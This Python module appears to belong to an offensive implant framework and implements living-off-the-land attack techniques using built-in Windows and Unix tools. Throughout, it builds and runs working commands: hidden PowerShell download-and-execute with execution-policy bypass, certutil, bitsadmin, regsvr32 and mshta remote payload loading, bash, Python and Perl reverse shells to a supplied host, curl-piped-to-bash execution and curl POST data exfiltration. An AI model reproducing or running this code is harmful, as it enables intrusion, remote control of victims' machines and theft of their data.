# Living Off The Land (LOLBAS) Module
# Implements living-off-the-land techniques using legitimate system tools

import os
import sys
import subprocess
import tempfile
import base64
import json
from config import DEBUG_MODE
from core.stealth import stealth_manager

class LOLBASManager:
    """Manages living-off-the-land binary and script techniques"""
    
    def __init__(self):
        self.is_windows = sys.platform == "win32"
        self.is_linux = sys.platform.startswith("linux")
        self.is_macos = sys.platform == "darwin"
        self.lolbas_history = []
        
        # LOLBAS techniques database
        self.windows_lolbas = {
            'powershell': {
                'executables': ['powershell.exe', 'pwsh.exe'],
                'techniques': [
                    'download_execute',
                    'base64_encode_execute',
                    'invoke_expression',
                    'bypass_execution_policy'
                ]
            },
            'certutil': {
                'executables': ['certutil.exe'],
                'techniques': [
                    'download_file',
                    'encode_decode_file',
                    'verify_file_hash'
                ]
            },
            'bitsadmin': {
                'executables': ['bitsadmin.exe'],
                'techniques': [
                    'download_file',
                    'transfer_file',
                    'create_job'
                ]
            },
            'wmic': {
                'executables': ['wmic.exe'],
                'techniques': [
                    'process_call_create',
                    'file_copy',
                    'remote_execution'
                ]
            },
            'rundll32': {
                'executables': ['rundll32.exe'],
                'techniques': [
                    'execute_javascript',
                    'execute_com_object',
                    'load_dll'
                ]
            },
            'regsvr32': {
                'executables': ['regsvr32.exe'],
                'techniques': [
                    'execute_scriptlet',
                    'load_com_object',
                    'bypass_security'
                ]
            },
            'mshta': {
                'executables': ['mshta.exe'],
                'techniques': [
                    'execute_html_application',
                    'run_javascript',
                    'execute_vbscript'
                ]
            }
        }
        
        self.linux_lolbas = {
            'bash': {
                'executables': ['bash', 'sh'],
                'techniques': [
                    'download_execute',
                    'reverse_shell',
                    'base64_execution'
                ]
            },
            'curl': {
                'executables': ['curl'],
                'techniques': [
                    'download_file',
                    'post_data',
                    'execute_remote'
                ]
            },
            'wget': {
                'executables': ['wget'],
                'techniques': [
                    'download_file',
                    'recursive_download',
                    'post_data'
                ]
            },
            'python': {
                'executables': ['python', 'python3'],
                'techniques': [
                    'download_execute',
                    'reverse_shell',
                    'base64_execution'
                ]
            },
            'perl': {
                'executables': ['perl'],
                'techniques': [
                    'download_execute',
                    'reverse_shell',
                    'base64_execution'
                ]
            }
        }
    
    def execute_lolbas_technique(self, tool, technique, parameters=None):
        """Execute a LOLBAS technique"""
        try:
            if self.is_windows:
                return self._execute_windows_lolbas(tool, technique, parameters)
            elif self.is_linux or self.is_macos:
                return self._execute_unix_lolbas(tool, technique, parameters)
            else:
                return False
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"LOLBAS execution failed: {e}")
                )
            return False
    
    def _execute_windows_lolbas(self, tool, technique, parameters):
        """Execute Windows LOLBAS technique"""
        try:
            if tool not in self.windows_lolbas:
                return False
            
            tool_info = self.windows_lolbas[tool]
            if technique not in tool_info['techniques']:
                return False
            
            # Find available executable
            executable = None
            for exe in tool_info['executables']:
                if self._check_executable_exists(exe):
                    executable = exe
                    break
            
            if not executable:
                return False
            
            # Execute specific technique
            if tool == 'powershell':
                return self._powershell_technique(executable, technique, parameters)
            elif tool == 'certutil':
                return self._certutil_technique(executable, technique, parameters)
            elif tool == 'bitsadmin':
                return self._bitsadmin_technique(executable, technique, parameters)
            elif tool == 'wmic':
                return self._wmic_technique(executable, technique, parameters)
            elif tool == 'rundll32':
                return self._rundll32_technique(executable, technique, parameters)
            elif tool == 'regsvr32':
                return self._regsvr32_technique(executable, technique, parameters)
            elif tool == 'mshta':
                return self._mshta_technique(executable, technique, parameters)
            
            return False
            
        except Exception:
            return False
    
    def _powershell_technique(self, executable, technique, parameters):
        """Execute PowerShell LOLBAS technique"""
        try:
            if technique == 'download_execute':
                url = parameters.get('url', '')
                if not url:
                    return False
                
                cmd = [
                    executable,
                    '-WindowStyle', 'Hidden',
                    '-ExecutionPolicy', 'Bypass',
                    '-Command', f'IEX (New-Object Net.WebClient).DownloadString("{url}")'
                ]
                
            elif technique == 'base64_encode_execute':
                script = parameters.get('script', '')
                if not script:
                    return False
                
                encoded = base64.b64encode(script.encode('utf-16le')).decode()
                cmd = [
                    executable,
                    '-WindowStyle', 'Hidden',
                    '-ExecutionPolicy', 'Bypass',
                    '-EncodedCommand', encoded
                ]
                
            elif technique == 'invoke_expression':
                command = parameters.get('command', '')
                if not command:
                    return False
                
                cmd = [
                    executable,
                    '-WindowStyle', 'Hidden',
                    '-ExecutionPolicy', 'Bypass',
                    '-Command', f'Invoke-Expression "{command}"'
                ]
                
            elif technique == 'bypass_execution_policy':
                script_path = parameters.get('script_path', '')
                if not script_path:
                    return False
                
                cmd = [
                    executable,
                    '-WindowStyle', 'Hidden',
                    '-ExecutionPolicy', 'Bypass',
                    '-File', script_path
                ]
            else:
                return False
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            success = result.returncode == 0
            
            self.lolbas_history.append({
                'tool': 'powershell',
                'technique': technique,
                'executable': executable,
                'success': success,
                'timestamp': stealth_manager.safe_execute(lambda: __import__('time').time()),
                'parameters': parameters
            })
            
            return success
            
        except Exception:
            return False
    
    def _certutil_technique(self, executable, technique, parameters):
        """Execute CertUtil LOLBAS technique"""
        try:
            if technique == 'download_file':
                url = parameters.get('url', '')
                output_file = parameters.get('output_file', '')
                if not url or not output_file:
                    return False
                
                cmd = [executable, '-urlcache', '-split', '-f', url, output_file]
                
            elif technique == 'encode_decode_file':
                file_path = parameters.get('file_path', '')
                encode = parameters.get('encode', True)
                if not file_path:
                    return False
                
                if encode:
                    cmd = [executable, '-encode', file_path, file_path + '.b64']
                else:
                    cmd = [executable, '-decode', file_path, file_path.replace('.b64', '')]
            else:
                return False
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            success = result.returncode == 0
            
            self.lolbas_history.append({
                'tool': 'certutil',
                'technique': technique,
                'executable': executable,
                'success': success,
                'timestamp': stealth_manager.safe_execute(lambda: __import__('time').time()),
                'parameters': parameters
            })
            
            return success
            
        except Exception:
            return False
    
    def _bitsadmin_technique(self, executable, technique, parameters):
        """Execute BitsAdmin LOLBAS technique"""
        try:
            if technique == 'download_file':
                url = parameters.get('url', '')
                output_file = parameters.get('output_file', '')
                job_name = parameters.get('job_name', 'DownloadJob')
                if not url or not output_file:
                    return False
                
                cmd = [
                    executable, '/transfer', job_name,
                    '/download', '/priority', 'normal',
                    url, output_file
                ]
            else:
                return False
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            success = result.returncode == 0
            
            self.lolbas_history.append({
                'tool': 'bitsadmin',
                'technique': technique,
                'executable': executable,
                'success': success,
                'timestamp': stealth_manager.safe_execute(lambda: __import__('time').time()),
                'parameters': parameters
            })
            
            return success
            
        except Exception:
            return False
    
    def _wmic_technique(self, executable, technique, parameters):
        """Execute WMIC LOLBAS technique"""
        try:
            if technique == 'process_call_create':
                command = parameters.get('command', '')
                if not command:
                    return False
                
                cmd = [
                    executable, 'process', 'call', 'create', command
                ]
                
            elif technique == 'file_copy':
                source = parameters.get('source', '')
                destination = parameters.get('destination', '')
                if not source or not destination:
                    return False
                
                cmd = [
                    executable, 'datafile', 'where', f'name="{source}"', 'call', 'copy', destination
                ]
            else:
                return False
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            success = result.returncode == 0
            
            self.lolbas_history.append({
                'tool': 'wmic',
                'technique': technique,
                'executable': executable,
                'success': success,
                'timestamp': stealth_manager.safe_execute(lambda: __import__('time').time()),
                'parameters': parameters
            })
            
            return success
            
        except Exception:
            return False
    
    def _rundll32_technique(self, executable, technique, parameters):
        """Execute Rundll32 LOLBAS technique"""
        try:
            if technique == 'execute_javascript':
                script = parameters.get('script', '')
                if not script:
                    return False
                
                cmd = [
                    executable, 'javascript:"\\..\\mshtml,RunHTMLApplication"',
                    f'document.write();alert("{script}")'
                ]
            else:
                return False
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            success = result.returncode == 0
            
            self.lolbas_history.append({
                'tool': 'rundll32',
                'technique': technique,
                'executable': executable,
                'success': success,
                'timestamp': stealth_manager.safe_execute(lambda: __import__('time').time()),
                'parameters': parameters
            })
            
            return success
            
        except Exception:
            return False
    
    def _regsvr32_technique(self, executable, technique, parameters):
        """Execute Regsvr32 LOLBAS technique"""
        try:
            if technique == 'execute_scriptlet':
                url = parameters.get('url', '')
                if not url:
                    return False
                
                cmd = [
                    executable, '/s', '/u', '/i:' + url, 'scrobj.dll'
                ]
            else:
                return False
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            success = result.returncode == 0
            
            self.lolbas_history.append({
                'tool': 'regsvr32',
                'technique': technique,
                'executable': executable,
                'success': success,
                'timestamp': stealth_manager.safe_execute(lambda: __import__('time').time()),
                'parameters': parameters
            })
            
            return success
            
        except Exception:
            return False
    
    def _mshta_technique(self, executable, technique, parameters):
        """Execute Mshta LOLBAS technique"""
        try:
            if technique == 'execute_html_application':
                url = parameters.get('url', '')
                if not url:
                    return False
                
                cmd = [executable, url]
            else:
                return False
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            success = result.returncode == 0
            
            self.lolbas_history.append({
                'tool': 'mshta',
                'technique': technique,
                'executable': executable,
                'success': success,
                'timestamp': stealth_manager.safe_execute(lambda: __import__('time').time()),
                'parameters': parameters
            })
            
            return success
            
        except Exception:
            return False
    
    def _execute_unix_lolbas(self, tool, technique, parameters):
        """Execute Unix/Linux LOLBAS technique"""
        try:
            if tool not in self.linux_lolbas:
                return False
            
            tool_info = self.linux_lolbas[tool]
            if technique not in tool_info['techniques']:
                return False
            
            # Find available executable
            executable = None
            for exe in tool_info['executables']:
                if self._check_executable_exists(exe):
                    executable = exe
                    break
            
            if not executable:
                return False
            
            # Execute specific technique
            if tool == 'bash':
                return self._bash_technique(executable, technique, parameters)
            elif tool == 'curl':
                return self._curl_technique(executable, technique, parameters)
            elif tool == 'wget':
                return self._wget_technique(executable, technique, parameters)
            elif tool == 'python':
                return self._python_technique(executable, technique, parameters)
            elif tool == 'perl':
                return self._perl_technique(executable, technique, parameters)
            
            return False
            
        except Exception:
            return False
    
    def _bash_technique(self, executable, technique, parameters):
        """Execute Bash LOLBAS technique"""
        try:
            if technique == 'download_execute':
                url = parameters.get('url', '')
                if not url:
                    return False
                
                cmd = [executable, '-c', f'curl {url} | bash']
                
            elif technique == 'reverse_shell':
                host = parameters.get('host', '')
                port = parameters.get('port', '')
                if not host or not port:
                    return False
                
                cmd = [executable, '-c', f'bash -i >& /dev/tcp/{host}/{port} 0>&1']
                
            elif technique == 'base64_execution':
                script = parameters.get('script', '')
                if not script:
                    return False
                
                encoded = base64.b64encode(script.encode()).decode()
                cmd = [executable, '-c', f'echo {encoded} | base64 -d | bash']
            else:
                return False
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True
            )
            
            success = result.returncode == 0
            
            self.lolbas_history.append({
                'tool': 'bash',
                'technique': technique,
                'executable': executable,
                'success': success,
                'timestamp': stealth_manager.safe_execute(lambda: __import__('time').time()),
                'parameters': parameters
            })
            
            return success
            
        except Exception:
            return False
    
    def _curl_technique(self, executable, technique, parameters):
        """Execute Curl LOLBAS technique"""
        try:
            if technique == 'download_file':
                url = parameters.get('url', '')
                output_file = parameters.get('output_file', '')
                if not url:
                    return False
                
                cmd = [executable, '-s', url]
                if output_file:
                    cmd.extend(['-o', output_file])
                else:
                    cmd.extend(['|', 'bash'])
                    
            elif technique == 'post_data':
                url = parameters.get('url', '')
                data = parameters.get('data', '')
                if not url or not data:
                    return False
                
                cmd = [executable, '-s', '-X', 'POST', '-d', data, url]
            else:
                return False
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                shell=True
            )
            
            success = result.returncode == 0
            
            self.lolbas_history.append({
                'tool': 'curl',
                'technique': technique,
                'executable': executable,
                'success': success,
                'timestamp': stealth_manager.safe_execute(lambda: __import__('time').time()),
                'parameters': parameters
            })
            
            return success
            
        except Exception:
            return False
    
    def _wget_technique(self, executable, technique, parameters):
        """Execute Wget LOLBAS technique"""
        try:
            if technique == 'download_file':
                url = parameters.get('url', '')
                output_file = parameters.get('output_file', '')
                if not url:
                    return False
                
                cmd = [executable, '-q', url]
                if output_file:
                    cmd.extend(['-O', output_file])
            else:
                return False
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True
            )
            
            success = result.returncode == 0
            
            self.lolbas_history.append({
                'tool': 'wget',
                'technique': technique,
                'executable': executable,
                'success': success,
                'timestamp': stealth_manager.safe_execute(lambda: __import__('time').time()),
                'parameters': parameters
            })
            
            return success
            
        except Exception:
            return False
    
    def _python_technique(self, executable, technique, parameters):
        """Execute Python LOLBAS technique"""
        try:
            if technique == 'download_execute':
                url = parameters.get('url', '')
                if not url:
                    return False
                
                cmd = [executable, '-c', f'import urllib.request; exec(urllib.request.urlopen("{url}").read())']
                
            elif technique == 'reverse_shell':
                host = parameters.get('host', '')
                port = parameters.get('port', '')
                if not host or not port:
                    return False
                
                script = f'''
import socket, subprocess, os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{host}",{port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
'''
                cmd = [executable, '-c', script]
                
            elif technique == 'base64_execution':
                script = parameters.get('script', '')
                if not script:
                    return False
                
                encoded = base64.b64encode(script.encode()).decode()
                cmd = [executable, '-c', f'import base64; exec(base64.b64decode("{encoded}"))']
            else:
                return False
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True
            )
            
            success = result.returncode == 0
            
            self.lolbas_history.append({
                'tool': 'python',
                'technique': technique,
                'executable': executable,
                'success': success,
                'timestamp': stealth_manager.safe_execute(lambda: __import__('time').time()),
                'parameters': parameters
            })
            
            return success
            
        except Exception:
            return False
    
    def _perl_technique(self, executable, technique, parameters):
        """Execute Perl LOLBAS technique"""
        try:
            if technique == 'download_execute':
                url = parameters.get('url', '')
                if not url:
                    return False
                
                cmd = [executable, '-e', f'use LWP::Simple; getprint("{url}") | perl']
                
            elif technique == 'reverse_shell':
                host = parameters.get('host', '')
                port = parameters.get('port', '')
                if not host or not port:
                    return False
                
                cmd = [executable, '-e', f'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}}']
            else:
                return False
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True
            )
            
            success = result.returncode == 0
            
            self.lolbas_history.append({
                'tool': 'perl',
                'technique': technique,
                'executable': executable,
                'success': success,
                'timestamp': stealth_manager.safe_execute(lambda: __import__('time').time()),
                'parameters': parameters
            })
            
            return success
            
        except Exception:
            return False
    
    def _check_executable_exists(self, executable):
        """Check if executable exists in system PATH"""
        try:
            result = subprocess.run(
                ['where' if self.is_windows else 'which', executable],
                capture_output=True,
                text=True
            )
            return result.returncode == 0
        except Exception:
            return False
    
    def get_lolbas_history(self):
        """Get LOLBAS execution history"""
        return self.lolbas_history
    
    def clear_lolbas_history(self):
        """Clear LOLBAS execution history"""
        self.lolbas_history.clear()
    
    def get_available_tools(self):
        """Get list of available LOLBAS tools for current platform"""
        if self.is_windows:
            return self.windows_lolbas.keys()
        elif self.is_linux or self.is_macos:
            return self.linux_lolbas.keys()
        return []

# Global LOLBAS manager instance
lolbas_manager = LOLBASManager()
